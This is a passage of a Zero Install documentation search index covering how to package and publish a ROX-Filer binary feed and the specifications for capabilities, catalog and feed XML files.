old <implementation> to give the digest and download location: <group main=\"ROX-Filer/AppRun\"> <implementation arch=\"Linux-ppc64\" id=\"sha1=2bce88f31415898760373fff900890a8719ab1e6\" released=\"2006-02-26\" version=\"2.4.1\"> <archive extract=\"rox-linux-ppc64-2.4.1\" href=\"http://example.org/rox-linux-ppc64-2.4.1.tgz\" size=\"1375566\"/> </implementation> </group> You should be able to download and test your binary with this command: $ 0launch ./ROX-Filer-ppc64 Publishing the interface with Zero Install 1. Set the uri at the top of the file to where-ever you're going to upload it: <?xml version=\"1.0\" ?> <interface xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\" uri='http://example.com/2006/0launch/ROX-Filer-ppc'> TODO: 0publish should have a working --local option! (note: from version 0.3, 0publish does support --local in this case, when creating a new interface) 2. Sign and upload the interface (see the packaging guide for information about creating, exporting and uploading your GPG key): $ 0publish --gpgsign ROX-Filer-ppc64 $ mv ROX-Filer-ppc64 /var/www/... Other users of ppc64 machines can now either run this directly, or add it as a feed (so it will be used by other programs trying to run ROX-Filer): $ 0launch --feed http://example.com/2006/0launch/ROX-Filer-ppc You should now tell the maintainer of the master feed about this one, so that they can add a <feed> element to the master copy to save users from having to add the feed manually. For an example of a master interface with feeds for different architectures, take a look at the <feed> elements in the real ROX-Filer interface .","title":"ROX-Filer"},{"location":"packaging/examples/rox/#general-operation","text":"0publish edits interface files in place. It loads the file, transforms it in some way (such as setting the release date, or adding a new implementation) and then writes it back out again. If the input file was signed, it will resign it when saving with the same key by default. You can also use it to add a signature, or to change the signing key. You can create an alias for 0publish in the usual way, to save typing: $ 0install add 0publish http://0install.net/2006/interfaces/0publish","title":"General operation"},{"location":"packaging/examples/rox/#creating-a-binary-of-rox-filer","text":"For this example we'll compile a binary of ROX-Filer for our platform (we'll assume there isn't one already) and make a feed for other people with the same platform (I'll use ppc64 for the examples). Start by creating an archive as normal: 1. Download the ROX-Filer source release (and detached signature): $ wget http://heanet.dl.sourceforge.net/sourceforge/rox/rox-2.4.1.tgz $ wget http://heanet.dl.sourceforge.net/sourceforge/rox/rox-2.4.1.tgz.sig $ gpg rox-2.4.1.tgz.sig gpg: Signature made Fri 30 Dec 2005 17:32:53 GMT using DSA key ID 59A53CC1 gpg: Good signature from \"Thomas Leonard <...>\" 2. Build as normal: $ tar xzf rox-2.4.1.tgz $ cd rox-2.4.1 $ ./ROX-Filer/AppRun --compile 3. Delete the debugging symbols and the build and src directories to save space: $ rm -r ROX-Filer/{ROX-Filer.dbg,build,src} 4. The ROX-Filer source download includes a local interface file called ROX-Filer.xml . This allows people to register local versions using 0launch --feed . Set the release date and architecture in it: $ 0publish --set-released 2006-02-26 ROX-Filer.xml $ 0publish --set-arch Linux-ppc64 ROX-Filer.xml You can also edit it to change the name and description if you want. The file should now look like this: <?xml version='1.0'?> <interface xmlns='http://zero-install.sourceforge.net/2004/injector/interface'> <name>ROX-Filer-ppc64</name> <summary>PPC64 binaries for ROX-Filer</summary> <description> ROX-Filer is a fast and powerful graphical file manager. It has full drag-and-drop support and background file operations, and is highly configurable. It can also act as a pinboard, allowing you to pin frequently used files to the desktop background. </description> <feed-for interface='http://rox.sourceforge.net/2005/interfaces/ROX-Filer'/> <group main='ROX-Filer/AppRun'> <implementation id=\".\" version=\"2.4.1\" released='2006-02-26' arch='Linux-ppc64'/> </group> </interface> 5. Add the architecture to the directory name and tar it all up (we include the architecture in the directory and archive names for clarity only; you can name them whatever you like): $ cd .. $ mv rox{,-linux-ppc64}-2.4.1 $ tar czf rox-linux-ppc64-2.4.1{.tgz,} 6. Upload it somewhere. I'll assume http://example.org/rox-linux-ppc64-2.4.1.tgz in the following examples.","title":"Creating a binary of ROX-Filer"},{"location":"packaging/examples/rox/#adding-the-archive-to-the-interface","text":"To make our new binary available through Zero Install: 1. Take a copy of the local interface from the archive. We'll use 0publish to change the id from . to the archive's digest and to add an <archive> element: $ cp rox-linux-ppc64-2.4.1/ROX-Filer.xml ROX-Filer-ppc64 $ 0publish ROX-Filer-ppc64 \\ --archive-url http://example.org/rox-linux-ppc64-2.4.1.tgz \\ --archive-file rox-linux-ppc64-2.4.1.tgz \\ --archive-extract rox-linux-ppc64-2.4.1 The local .tgz file is used by 0publish to get the size and manifest digest. The extract value is used as the <archive> 's extract attribute and must match the name of the top-level directory in the archive. If you now view the ROX-Filer-ppc64 file, you should see that 0publish has converted the old <implementation> to give the digest and download location: <group main=\"ROX-Filer/AppRun\"> <implementation arch=\"Linux-ppc64\" id=\"sha1=2bce88f31415898760373fff900890a8719ab1e6\" released=\"2006-02-26\" version=\"2.4.1\"> <archive extract=\"rox-linux-ppc64-2.4.1\" href=\"http://example.org/rox-linux-ppc64-2.4.1.tgz\" size=\"1375566\"/> </implementation> </group> You should be able to download and test your binary with this command: $ 0launch ./ROX-Filer-ppc64","title":"Adding the archive to the interface"},{"location":"packaging/examples/rox/#publishing-the-interface-with-zero-install","text":"1. Set the uri at the top of the file to where-ever you're going to upload it: <?xml version=\"1.0\" ?> <interface xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\" uri='http://example.com/2006/0launch/ROX-Filer-ppc'> TODO: 0publish should have a working --local option! (note: from version 0.3, 0publish does support --local in this case, when creating a new interface) 2. Sign and upload the interface (see the packaging guide for information about creating, exporting and uploading your GPG key): $ 0publish --gpgsign ROX-Filer-ppc64 $ mv ROX-Filer-ppc64 /var/www/... Other users of ppc64 machines can now either run this directly, or add it as a feed (so it will be used by other programs trying to run ROX-Filer): $ 0launch --feed http://example.com/2006/0launch/ROX-Filer-ppc You should now tell the maintainer of the master feed about this one, so that they can add a <feed> element to the master copy to save users from having to add the feed manually. For an example of a master interface with feeds for different architectures, take a look at the <feed> elements in the real ROX-Filer interface .","title":"Publishing the interface with Zero Install"},{"location":"specifications/","text":"Feed files This document is a formal description of the XML feed file format. An interface describes a program, library or other component. A feed provides a list of known implementations of the interface (versions of the program) and details about how to get them, how to check that they are authentic, how to run them and what other components they depend on. Capabilities extension This document is a formal description of the Capabilities extension of the feed format. Capabilities provide information for desktop integration of applications, such as supported MIME types. Catalog files This document is a formal description of the XML catalog format. A catalog contains meta-data for a collection of feeds. Catalogs make it easier to find feeds for specific applications. Selections files This document describes the format of 0install's XML selections documents. A selections document contains all the information needed to launch a program. 0install generates a selections document by collecting information from multiple feeds and then running a solver to choose the best combination of components. Manifest files Zero Install implementations are directory trees identified by an algorithm name (e.g., \"sha1\"), and digest of their contents calculated using that algorithm. Adding, deleting, renaming or modifying any file in a tree will change its digest. It should be infeasibly difficult to generate a new tree with the same digest as a given tree. Thus, if you know the digest of the implementation you want, and someone gives you a tree with that digest, you can trust that it is the implementation you want. This document describes how a digest is calculated from a directory tree.","title":"Overview"},{"location":"specifications/capabilities/","text":"This document is a formal description of the Capabilities extension of the feeds format . A capability tells the desktop environment what an application can do (e.g., suported file types) and in which fashion this can be represented to the user. This is used for desktop integration (currently only supported on Windows). XSD schema Contents: Syntax Capability types File types URL protocols Context menu entries AutoPlay handlers Default programs Verbs Icons Further reading Syntax Capability extensions for feeds have following syntax ( ? follows optional items, * means zero-or-more, order of elements is not important): <?xml version='1.0'?> <interface xmlns='http://zero-install.sourceforge.net/2004/injector/interface' uri='...'> ... <capabilities xmlns='http://0install.de/schema/desktop-integration/capabilities' os='...' ?> [capability] * </capabilities> * </interface> os Specifies for which operating system the capabilities are applicable (e.g., os=\"Windows\" for Windows systems). Capability types File types An application's ability to open certain file types. <file-type id='...' explicit-only='true' ?> <extension value='...' mime-type='...' ? perceived-type='...' ?/> * <description xml:lang='...' ?>...</description> * [verb] * [icon] * </file-type> id An ID that uniquely identifies this file type within the feed. Also serves as a programmatic identifier within the desktop environment. In case of conflicts, the first file type listed with a specific ID will take precedence. explicit-only When set to true the app is not set as the default handler for this file type without explicit confirmation from the user. <extension> A file extension used to identify a file type. value is the file extension including the leading dot (e.g., .png ). mime-type is the (optional) MIME type associated with the file extension. perceived-type specifies the broad category of file types (e.g., text , image , audio ) this file type falls into. <description> A (localized) description of the file type. See: Verbs , Icons URL protocols An application's ability to handle certain URL protocols/schemas such as HTTP. <url-protocol id='...' explicit-only='true' ?> <known-prefix value='...'/> * <description xml:lang='...' ?>...</description> * [verb] * [icon] * </url-protocol> id If you are registering an application-specific URL protocols (e.g., myapp:... ) this value must be the schema name (e.g., myapp ). If you are registering support for a well-known protocol such as HTTP, this value instead is just a unique identifier within the feed. The schema is instead specified using <known-prefix> (see below). explicit-only When set to true the app is not set as the default handler for this URL protocol without explicit confirmation from the user. <known-prefix> Names a well-known protocol such as http or ftp . Not for application-specific protocols! <description> A (localized) description of the URL protocol. See: Verbs , Icons Context menu entries Entries in the file manager's context menu for all file types. <context-menu id='...' target='...' ? explicit-only='true' ?> [verb] * </context-menu> id An ID that uniquely identifies this context menu entry within the feed. Also serves as a programmatic identifier within the desktop environment. In case of conflicts, the first context menu entry listed with a specific ID will take precedence. target Controls whether the context menu entry is display for all files ( files ), only executable files ( executable-files ), all directories ( directories ) or all filesystem objects ( all ). Defaults to files if not set. explicit-only When set to true this context menu entry is not added without explicit confirmation from the user. See: Verbs AutoPlay handlers An application's ability to handle AutoPlay events. <auto-play id='...' provider='...' ?> <event name='...'/> * <description xml:lang='...' ?>...</description> * [verb] * [icon] * </auto-play> id An ID that uniquely identifies this AutoPlay handler within the feed. Also serves as a programmatic identifier within the desktop environment. In case of conflicts, the first AutoPlay handler listed with a specific ID will take precedence. provider The name of the application as shown in the AutoPlay selection list. <event> A specific AutPlay event. Well-known values on Windows are: PlayCDAudioOnArrival , PlayDVDAudioOnArrival , PlayMusicFilesOnArrival , PlayVideoCDMovieOnArrival , PlaySuperVideoCDMovieOnArrival , PlayDVDMovieOnArrival , PlayBluRayOnArrival , PlayVideoFilesOnArrival , HandleCDBurningOnArrival , HandleDVDBurningOnArrival , HandleBDBurningOnArrival <description> A (localized) description of the AutoPlay handler. See: Verbs , Icons Default programs Ability to act as default programs for well-known services such web-browser or e-mail client. <default-program id='...' service='...' explicit-only='true' ? /> id An ID that uniquely identifies this default program registration within the feed. Also serves as a programmatic identifier within the desktop environment. In case of conflicts, the first default program registration listed with a specific ID will take precedence. service The name of the service the application provides. Well-known values on Windows are: Mail , Media , IM , JVM , Calender , Contacts , Internet Call explicit-only When set to true the app is not registered as a default program without explicit confirmation from the user. Verbs Some capabilities require you to map verbs/actions to specific commands in the feed. <verb name='...' command='...' ? args='...' extended='true' ?> <description xml:lang='...' ?>...</description> * </verb> name The name of the verb. Use canonical names ( open , opennew , edit , play , print , Preview ) to get automatic localization; specify <description> s otherwise. command The name of the command to use when launching via this capability. Defaults to run if not set. args A custom arguments list to be passed to the command. %1 will be replaced with the path of the file being opened. extended Set this to true to hide the verb in the Windows context menu unless the Shift key is pressed when opening the menu. <description> A (localized) description of the verb. Icons Some capabilities allow you to specify an icon. <icon xmlns='http://zero-install.sourceforge.net/2004/injector/interface' type='...' href='...' ?/> Note: Since <icon> is defined by the regular feed format , you need to explicitly specify the XML namespace as shown above, when placing <icon> s within capabilities. type The MIME type of the icon. Should be image/vnd.microsoft.icon ( .ico ) for Windows. href The URL where the icon can be downloaded. Further reading Paper: Desktop Integration Management for Portable, Zero-Install and Virtualized Applications","title":"Capabilities extension"},{"location":"specifications/capabilities/#syntax","text":"Capability extensions for feeds have following syntax ( ? follows optional items, * means zero-or-more, order of elements is not important): <?xml version='1.0'?> <interface xmlns='http://zero-install.sourceforge.net/2004/injector/interface' uri='...'> ... <capabilities xmlns='http://0install.de/schema/desktop-integration/capabilities' os='...' ?> [capability] * </capabilities> * </interface> os Specifies for which operating system the capabilities are applicable (e.g., os=\"Windows\" for Windows systems).","title":"Syntax"},{"location":"specifications/capabilities/#capability-types","text":"","title":"Capability types"},{"location":"specifications/capabilities/#file-types","text":"An application's ability to open certain file types. <file-type id='...' explicit-only='true' ?> <extension value='...' mime-type='...' ? perceived-type='...' ?/> * <description xml:lang='...' ?>...</description> * [verb] * [icon] * </file-type> id An ID that uniquely identifies this file type within the feed. Also serves as a programmatic identifier within the desktop environment. In case of conflicts, the first file type listed with a specific ID will take precedence. explicit-only When set to true the app is not set as the default handler for this file type without explicit confirmation from the user. <extension> A file extension used to identify a file type. value is the file extension including the leading dot (e.g., .png ). mime-type is the (optional) MIME type associated with the file extension. perceived-type specifies the broad category of file types (e.g., text , image , audio ) this file type falls into. <description> A (localized) description of the file type. See: Verbs , Icons","title":"File types"},{"location":"specifications/capabilities/#url-protocols","text":"An application's ability to handle certain URL protocols/schemas such as HTTP. <url-protocol id='...' explicit-only='true' ?> <known-prefix value='...'/> * <description xml:lang='...' ?>...</description> * [verb] * [icon] * </url-protocol> id If you are registering an application-specific URL protocols (e.g., myapp:... ) this value must be the schema name (e.g., myapp ). If you are registering support for a well-known protocol such as HTTP, this value instead is just a unique identifier within the feed. The schema is instead specified using <known-prefix> (see below). explicit-only When set to true the app is not set as the default handler for this URL protocol without explicit confirmation from the user. <known-prefix> Names a well-known protocol such as http or ftp . Not for application-specific protocols! <description> A (localized) description of the URL protocol. See: Verbs , Icons","title":"URL protocols"},{"location":"specifications/capabilities/#context-menu-entries","text":"Entries in the file manager's context menu for all file types. <context-menu id='...' target='...' ? explicit-only='true' ?> [verb] * </context-menu> id An ID that uniquely identifies this context menu entry within the feed. Also serves as a programmatic identifier within the desktop environment. In case of conflicts, the first context menu entry listed with a specific ID will take precedence. target Controls whether the context menu entry is display for all files ( files ), only executable files ( executable-files ), all directories ( directories ) or all filesystem objects ( all ). Defaults to files if not set. explicit-only When set to true this context menu entry is not added without explicit confirmation from the user. See: Verbs","title":"Context menu entries"},{"location":"specifications/capabilities/#autoplay-handlers","text":"An application's ability to handle AutoPlay events. <auto-play id='...' provider='...' ?> <event name='...'/> * <description xml:lang='...' ?>...</description> * [verb] * [icon] * </auto-play> id An ID that uniquely identifies this AutoPlay handler within the feed. Also serves as a programmatic identifier within the desktop environment. In case of conflicts, the first AutoPlay handler listed with a specific ID will take precedence. provider The name of the application as shown in the AutoPlay selection list. <event> A specific AutPlay event. Well-known values on Windows are: PlayCDAudioOnArrival , PlayDVDAudioOnArrival , PlayMusicFilesOnArrival , PlayVideoCDMovieOnArrival , PlaySuperVideoCDMovieOnArrival , PlayDVDMovieOnArrival , PlayBluRayOnArrival , PlayVideoFilesOnArrival , HandleCDBurningOnArrival , HandleDVDBurningOnArrival , HandleBDBurningOnArrival <description> A (localized) description of the AutoPlay handler. See: Verbs , Icons","title":"AutoPlay handlers"},{"location":"specifications/capabilities/#default-programs","text":"Ability to act as default programs for well-known services such web-browser or e-mail client. <default-program id='...' service='...' explicit-only='true' ? /> id An ID that uniquely identifies this default program registration within the feed. Also serves as a programmatic identifier within the desktop environment. In case of conflicts, the first default program registration listed with a specific ID will take precedence. service The name of the service the application provides. Well-known values on Windows are: Mail , Media , IM , JVM , Calender , Contacts , Internet Call explicit-only When set to true the app is not registered as a default program without explicit confirmation from the user.","title":"Default programs"},{"location":"specifications/capabilities/#verbs","text":"Some capabilities require you to map verbs/actions to specific commands in the feed. <verb name='...' command='...' ? args='...' extended='true' ?> <description xml:lang='...' ?>...</description> * </verb> name The name of the verb. Use canonical names ( open , opennew , edit , play , print , Preview ) to get automatic localization; specify <description> s otherwise. command The name of the command to use when launching via this capability. Defaults to run if not set. args A custom arguments list to be passed to the command. %1 will be replaced with the path of the file being opened. extended Set this to true to hide the verb in the Windows context menu unless the Shift key is pressed when opening the menu. <description> A (localized) description of the verb.","title":"Verbs"},{"location":"specifications/capabilities/#icons","text":"Some capabilities allow you to specify an icon. <icon xmlns='http://zero-install.sourceforge.net/2004/injector/interface' type='...' href='...' ?/> Note: Since <icon> is defined by the regular feed format , you need to explicitly specify the XML namespace as shown above, when placing <icon> s within capabilities. type The MIME type of the icon. Should be image/vnd.microsoft.icon ( .ico ) for Windows. href The URL where the icon can be downloaded.","title":"Icons"},{"location":"specifications/capabilities/#further-reading","text":"Paper: Desktop Integration Management for Portable, Zero-Install and Virtualized Applications","title":"Further reading"},{"location":"specifications/catalog/","text":"This document is a formal description of the XML catalog format. A catalog contains meta-data for a collection of feeds . Catalogs make it easier to find feeds for specific applications. XSD schema Contents: Syntax Digital signatures Generating Usage Short names GUI Well-known catalogs Syntax Catalog files have the following syntax ( ? follows optional items, * means zero-or-more, order of elements is not important, and extension elements can appear anywhere as long as they use a different namespace): <?xml version='1.0'?> <catalog xmlns='http://0install.de/schema/injector/catalog'> <interface uri='...' xmlns='http://zero-install.sourceforge.net/2004/injector/interface'> <name>...</name> <summary>...</summary> <description>...</description> ? <homepage>...</homepage> ? <category type='...' ? >...</category> * <needs-terminal/> ? <icon type='...' href='...'/> * <entry-point command='...' binary-name='...' ? /> * </interface> * </catalog> The syntax within <interface> elements is identical to that of feeds . Each <interface> element represents a feed and contains a copy of that feed's body. However, <implementation> , <group> , <feed> , <feed-for> and <replaced-by> elements are omitted. They should instead be taken from the original feed, which can be downloaded from the specified uri when required. Digital signatures When a catalog is downloaded from the web, it must contain a digital signature. A catalog is signed by appending an XML comment block of the form: <!-- Base64 Signature iD8DBQBEXM/qrgeCgFmlPMERArNSAKDBuNz5SQMZ8rwJmW2fhNHJwor6KwCgwx7XEfY+6gUC90rJ b5eCY+I8HNA= --> This block must go at the end of the file, and contains a Base64-encoded version of the file that would be created by using gpg --detach-sign on the original feed. The signature block must start on a new line, may not contain anything except valid base64 characters, and nothing may follow the signature block. This is identical to the signature format used by feeds . Generating Catalog files are automatically generated by 0repo . You can also manually generate a catalog from a set of feeds downloaded to a local directory: $ 0install run --command=0publish http://0install.de/feeds/ZeroInstall_Tools.xml feeds/*.xml --catalog=catalog.xml --xmlsign Note: A catalog generated like this points to the locations the feeds originally came from, not the local XML files on your disk. Usage Catalog files are currently only used by Zero Install for Windows . You can search for feeds in catalogs like this: $ 0install catalog search KEYWORD See the command-line interface documentation for more commands. Short names Catalogs allow you to use short names on the command-line instead of entering full feed URIs. Short names are either equal to the application <name> as listed in the catalog (spaces replaced with dashes) or the application's binary-name specified in an <entry-point> . For example, instead of 0install run http://repo.roscidus.com/utils/vlc you can use: 0install run vlc-media-player (application name) or 0install run vlc (executable file name) GUI The main GUI of Zero Install for Windows displays a list of available applications populated by one or more catalogs. The default catalog can be extended with or replaced by custom catalogs in the Catalog tab of the Options window. Well-known catalogs http://repo.roscidus.com/catalog.xml - open-source tools, libraries and runtime environments http://0install.de/catalog/ - curated list of cross-platform and Windows applications, default catalog used by Zero Install for Windows","title":"Catalog files"},{"location":"specifications/catalog/#syntax","text":"Catalog files have the following syntax ( ? follows optional items, * means zero-or-more, order of elements is not important, and extension elements can appear anywhere as long as they use a different namespace): <?xml version='1.0'?> <catalog xmlns='http://0install.de/schema/injector/catalog'> <interface uri='...' xmlns='http://zero-install.sourceforge.net/2004/injector/interface'> <name>...</name> <summary>...</summary> <description>...</description> ? <homepage>...</homepage> ? <category type='...' ? >...</category> * <needs-terminal/> ? <icon type='...' href='...'/> * <entry-point command='...' binary-name='...' ? /> * </interface> * </catalog> The syntax within <interface> elements is identical to that of feeds . Each <interface> element represents a feed and contains a copy of that feed's body. However, <implementation> , <group> , <feed> , <feed-for> and <replaced-by> elements are omitted. They should instead be taken from the original feed, which can be downloaded from the specified uri when required.","title":"Syntax"},{"location":"specifications/catalog/#digital-signatures","text":"When a catalog is downloaded from the web, it must contain a digital signature. A catalog is signed by appending an XML comment block of the form: <!-- Base64 Signature iD8DBQBEXM/qrgeCgFmlPMERArNSAKDBuNz5SQMZ8rwJmW2fhNHJwor6KwCgwx7XEfY+6gUC90rJ b5eCY+I8HNA= --> This block must go at the end of the file, and contains a Base64-encoded version of the file that would be created by using gpg --detach-sign on the original feed. The signature block must start on a new line, may not contain anything except valid base64 characters, and nothing may follow the signature block. This is identical to the signature format used by feeds .","title":"Digital signatures"},{"location":"specifications/catalog/#generating","text":"Catalog files are automatically generated by 0repo . You can also manually generate a catalog from a set of feeds downloaded to a local directory: $ 0install run --command=0publish http://0install.de/feeds/ZeroInstall_Tools.xml feeds/*.xml --catalog=catalog.xml --xmlsign Note: A catalog generated like this points to the locations the feeds originally came from, not the local XML files on your disk.","title":"Generating"},{"location":"specifications/catalog/#usage","text":"Catalog files are currently only used by Zero Install for Windows . You can search for feeds in catalogs like this: $ 0install catalog search KEYWORD See the command-line interface documentation for more commands.","title":"Usage"},{"location":"specifications/catalog/#short-names","text":"Catalogs allow you to use short names on the command-line instead of entering full feed URIs. Short names are either equal to the application <name> as listed in the catalog (spaces replaced with dashes) or the application's binary-name specified in an <entry-point> . For example, instead of 0install run http://repo.roscidus.com/utils/vlc you can use: 0install run vlc-media-player (application name) or 0install run vlc (executable file name)","title":"Short names"},{"location":"specifications/catalog/#gui","text":"The main GUI of Zero Install for Windows displays a list of available applications populated by one or more catalogs. The default catalog can be extended with or replaced by custom catalogs in the Catalog tab of the Options window.","title":"GUI"},{"location":"specifications/catalog/#well-known-catalogs","text":"http://repo.roscidus.com/catalog.xml - open-source tools, libraries and runtime environments http://0install.de/catalog/ - curated list of cross-platform and Windows applications, default catalog used by Zero Install for Windows","title":"Well-known catalogs"},{"location":"specifications/feed/","text":"This document is a formal description of the XML feed file format. An interface describes a program, library or other component. A feed provides a list of known implementations of the interface (versions of the program) and details about how to get them, how to check that they are authentic, how to run them and what other components they depend on. This class diagram shows how the different concepts are related. Each feed file contributes information to this model: Each Feed lists a number of Implementations (versions). An Identity is a way to recognise an Implementation (e.g. a cryptographic digest). A Retrieval method is a way to get an Implementation (e.g. by downloading from an FTP site). A Command says how to run an Implementation as a program.A Dependency indicates that one component depends on another (e.g. Gimp requires the GTK library). A Binding says how to let the program locate the Implementations when run. A Constraint limits the choice of a dependency (e.g. Gimp requires a version of GTK >= 2.6). Note on terminology: originally the word 'interface' was used to mean both 'interface' and 'feed', so don't be confused if you see it used this way. XSD schema Contents: Introduction Groups Implementations Historical note about id Commands Package implementations Retrieval methods Recipes Dependencies Constraints Bindings Environment bindings Executable bindings Generic bindings Versions Stability When to use 'buggy' Entry points Metadata Digital signatures Valid architecture names The if-0install-version attribute Well-known extensions Future plans Introduction Feed files are introduced in the Packagers Documentation . They have the following syntax ( ? follows optional items, * means zero-or-more, order of elements is not important, and extension elements can appear anywhere as long as they use a different namespace): <?xml version='1.0'?> <interface xmlns='http://zero-install.sourceforge.net/2004/injector/interface' min-injector-version='...' ? uri='...' ? > <name>...</name> <summary>...</summary> <description>...</description> ? <homepage>...</homepage> ? <category type='...' ? >...</category> * <needs-terminal/> ? <icon type='...' href='...'/> * <feed src='../img/...' langs='...' ? arch='...' ?/> * <feed-for interface='...'/> * <replaced-by interface='...'/> ? [group] * [implementation] * [entry-point] * </interface> min-injector-version This attribute gives the oldest version of 0install that can read this file. Older versions will tell the user to upgrade if they are asked to read the file. Versions prior to 0.20 do not perform this check, however. If the attribute is not present, the file can be read by all versions. uri This attribute is only needed for remote feeds (fetched via HTTP). The value must exactly match the expected URL, to prevent an attacker replacing one correctly-signed feed with another (e.g., returning a feed for the shred program when the user asked for the backup program). <name> a short name to identify the interface (e.g. \"Foo\") <summary> a short one-line description; the first word should not be upper-case unless it is a proper noun (e.g. \"cures all ills\") <description> a full description, which can be several paragraphs long (optional since 0.32, but recommended) <homepage> the URL of a web-page describing this interface in more detail <category> a classification for the interface. If no type is given, then the category is one of the 'Main' categories defined by the freedesktop.org menu specification . Otherwise, it is a URI giving the namespace for the category. <needs-terminal> if present, this element indicates that the program requires a terminal in order to run. Graphical launchers should therefore run this program in a suitable terminal emulator. <icon> an icon to use for the program; this is used by programs such as AddApp and desktop integration . You should provide an icon of the type image/png ( .png ) for display in browsers and launchers on Linux. For Windows apps you should additionally provide an icon of the type image/vnd.microsoft.icon ( .ico ). <feed> the linked feed contains more implementations of this feed's interface. The langs and arch attributes, if present, indicate that all implementations will fall within these limits (e.g. arch='*-src' means that there is no point fetching this feed unless you are looking for source code). See the <implementation> element for a description of the values of these attributes. <feed-for> the implementations in this feed are implementations of the given interface. This is used when adding an optional extra feed to an interface with 0install add-feed (e.g. a local feed for a development version). <replaced-by> this feed's interface (the one in the root element's uri attribute) has been replaced by the given interface. Any references to the old URI should be updated to use the new one. Groups A group has this syntax: <group version='...' ? released='...' ? main='...' ? self-test='...' ? doc-dir='...' ? license='...' ? released='...' ? stability='...' ? langs='...' ? arch='...' ? > [requires] * [group] * [command] * [binding] * [implementation] * [package-implementation] * </group> All attributes of the group are inherited by any child groups and implementations as defaults, but can be overridden there. All dependencies ( requires ), bindings and commands are inherited (sub-groups may add more dependencies and bindings to the list, but cannot remove anything). Implementations An implementation has this syntax (an unspecified argument is inherited from the closest ancestor <group> which defines it): <implementation [all <group> attributes] id='...' local-path='...' ? > <manifest-digest [digest] * /> * [command] * [retrieval-method] * [binding] * [requires] * </implementation> id A unique identifier for this implementation. For example, when the user marks a particular version as buggy this identifier is used to keep track of it, and saving and restoring selections uses it. However, see the important historical note below. local-path If the feed file is a local file (the interface uri starts with / ) then the local-path attribute may contain the pathname of a local directory (either an absolute path or a path relative to the directory containing the feed file). See the historical note below. version The version number. See the version numbers section below for more details. main (deprecated) The relative path of an executable inside the implementation that should be executed by default when the interface is run. If an implementation has no main setting, then it cannot be executed without specifying one manually (with 0launch --main=MAIN ). This typically means that the interface is for a library. Note: main is being replaced by the <command> element. self-test (deprecated) The relative path of an executable inside the implementation that can be executed to test the program. The program must be non-interactive (e.g. it can't open any windows or prompt for input). It should return with an exit status of zero if the tests pass. Any other status indicates failure. Note: self-test is being replaced by the <command> element. doc-dir The relative path of a directory inside the implementation that contains the package's documentation. This is the directory that would end up inside /usr/share/doc on a traditional Linux system. released The date this implementation was made available, in the format YYYY-MM-DD . For development versions checked out from version control this attribute should not be present. stability The default stability rating for this implementation. If not present, testing is used. See the stability section below for more details. langs The natural language(s) which this package supports, as a space-separated list of languages codes (in the same format as used by the $LANG environment variable). For example, the value en_GB fr would be used for a package supporting British English and French. Supported since 0.48. Note that versions before 0.54 require the region separator to be _ (underscore), while later versions also allow the use of - for consistency with the xml:lang format. arch For platform-specific binaries, the platform for which this implementation was compiled, in the form os-cpu . 0install knows that certain platforms are backwards-compatible with others, so binaries with arch=\"Linux-i486\" will still be available on Linux-i686 machines, for example. Either the os or cpu part may be * , which will make it available on any OS or CPU. If missing, the default is *-* . See also: Valid architecture names . license License terms. This is typically a Trove category. See the PyPI list for some examples (the leading License :: is not included). The manifest-digest element is used to give digests of the .manifest file using various hashing algorithms (but see the historical note below). Having multiple algorithms allows a smooth upgrade to newer digest algorithms without breaking old clients. Each non-namespaced attribute gives a digest, with the attribute name being the algorithm. For example: <manifest-digest sha256=\"4f078f9080bd9b3b87e8360f014268886ec653ed077bb3cb6725185c0a07473a\"/> For non-local implementations (those without a local-path attribute), the <implementation> element contains a set of retrieval methods , each of which gives a different way of getting the implementation (i.e. of getting a directory structure whose digest matches the ones given). Currently, 0install always chooses the first of the methods it understands, but in future it may use other strategies (such as choosing the closest mirror, or letting the user select one manually). It may also use other methods which aren't listed, such as searching for the implementation on a peer-to-peer network. Unrecognised elements inside an implementation are ignored. Historical note about id 0launch >= 0.45 generally treats the ID as a simple identifier, and gets the local path (if any) from the local-path attribute and the digests from the <manifest-digest> . 0launch < 0.45 ignores the local-path attribute and the <manifest-digest> element. If the ID starts with . or / then the ID is also the local path; otherwise, it is the single manifest digest. For backwards compatibility, 0launch >= 0.45 will treat an ID starting with . or / as a local path if no local-path attribute is present, and it will treat it as an additional digest if it contains an = character. Therefore, if you want to generate feeds compatible with past and future versions: If you have a digest, set the ID to sha1new=... and put the sha256 digest in the <manifest-digest> . If you have a local implementation then set both id and local-path to the pathname. Commands The main attribute above provides a simple way to say how to run this implementation. The <command> element (supported since 0.51, released Dec 2010) provides a more flexible alternative. <command name='...' path='...' ? > [binding] * [requires] * [runner] ? <arg> ... </arg> * <for-each item-from='...' separator='...'? > ... </for-each> * </command> name By default, 0launch executes the run command, but the --command option can be used to specify a different one. 0test runs the test command (replacing the old self-test attribute) and 0compile runs the compile command (replacing the compile:command attribute). path The relative path of the executable within the implementation (optional if <runner> is used). Additional arguments can be passed using the <arg> element. Within an argument, ${name} is expanded to the value of the corresponding environment variable. These arguments are passed to the program before any arguments specified by the user. If an environment variable should be expanded to multiple arguments, use <for-each> . The variable in the item-from attribute is split using the given separator (which defaults to the OS path separator, : on POSIX and ; on Windows) and the arguments inside the element are added for each item. The current item is available as ${item} . If the variable given in item-from is not set or is empty, no arguments are added. See below for an example. Versions of 0install before 1.15 ignore <for-each> elements and their contents. Command-specific dependencies can be specified for a command by nesting <requires> elements. For example, an interpreter might only depend on libreadline when used interactively, but not when used as a library, or the test command might depend on a test framework. Command-specific bindings (0launch >= 1.3) create a binding from the implementation to itself. For example, the test command may want to make the run command available in $PATH using <executable-in-path> . The <runner> element introduces a special kind of dependency: the program that is used to run this one. For example, a Python program might specify Python as its runner. <runner> is a subclass of <requires> and accepts the same attributes and child elements. In addition, you can specify arguments to pass to the runner by nesting them inside the <runner> element. These arguments are passed before the path of the executable given by the path attribute. For example: <command name='run' path=\"causeway.e-swt\"> <runner interface='http://repo.roscidus.com/e/e-core'> <arg>-cpa</arg> <arg>$SWT_JAR</arg> <for-each item-from=\"EXTRA_E_OPTIONS\" separator=\" \"> <arg>${item}</arg> </for-each> </runner> </command> In this case, 0install will run the equivalent of /path/to/e-interpreter -cpa /path/to/swt.jar $EXTRA_E_OPTIONS /path/to/causeway.e-swt . Package implementations This element names a distribution-provided package which, if present, is a valid implementation of this interface. The syntax is: <package-implementation package='...' distributions='...' ? main='...' ? version='...' ? > [command] * [requires] * </package-implementation> Support for distribution packages was added in version 0.28 of 0install. Earlier versions ignore this element. If the named package is available then it will be considered as a possible implementation of the 